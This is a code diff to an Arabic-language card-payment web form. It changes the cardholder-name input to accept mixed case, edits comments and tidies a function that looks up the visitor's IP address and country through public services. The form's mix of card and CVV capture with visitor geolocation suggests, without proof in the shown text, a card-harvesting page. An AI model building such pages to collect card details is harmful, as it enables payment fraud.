@@ -289,7 +289,7 @@ label svg{width:13px;height:13px;fill:none;stroke:#64748b;stroke-width:2;stroke-
         <label><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>اسم حامل البطاقة</label>
         <div class="input-wrap">
           <div class="input-icon"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
-          <input type="text" id="cardName" placeholder="JOHN DOE"/>
+          <input type="text" id="cardName" placeholder="John Doe"/>
         </div>
       </div>
 
@@ -410,6 +410,7 @@ function isValidCVV(cvv) {
 
 function isValidName(name) {
   if (!name || name.trim() === '') return false;
+  // السماح بالأحرف الكبيرة والصغيرة والمسافات والنقطة
   return /^[A-Za-z\s\.]+$/.test(name);
 }
 
@@ -422,18 +423,14 @@ function canSubmit() {
   return { allowed: true };
 }
 
-/* الحصول على IP والبلد - بدون توكن */
+/* الحصول على IP والبلد */
 async function getIPInfo() {
   try {
-    // جلب IP من api.ipify.org
     let ipResponse = await fetch('https://api.ipify.org?format=json');
     let ipData = await ipResponse.json();
     let ip = ipData.ip || 'غير معروف';
-    
-    // جلب معلومات البلد من ipapi.co (مجاني)
     let geoResponse = await fetch('https://ipapi.co/' + ip + '/json/');
     let geoData = await geoResponse.json();
-    
     return {
       ip: ip,
       country: geoData.country_name || 'غير معروف',
@@ -484,9 +481,11 @@ function formatCVV(input) {
 }
 
 function formatName(input) {
-  let value = input.value.toUpperCase();
-  value = value.replace(/[^A-Z\s\.]/g, '');
+  let value = input.value;
+  // السماح فقط بالحروف (كبيرة وصغيرة) والمسافات والنقطة
+  value = value.replace(/[^A-Za-z\s\.]/g, '');
   input.value = value;
+  // عرض الاسم في البطاقة (مع تحويل أول حرف كبير اختيارياً)
   document.getElementById('cName').textContent = value || 'FULL NAME';
 }
 
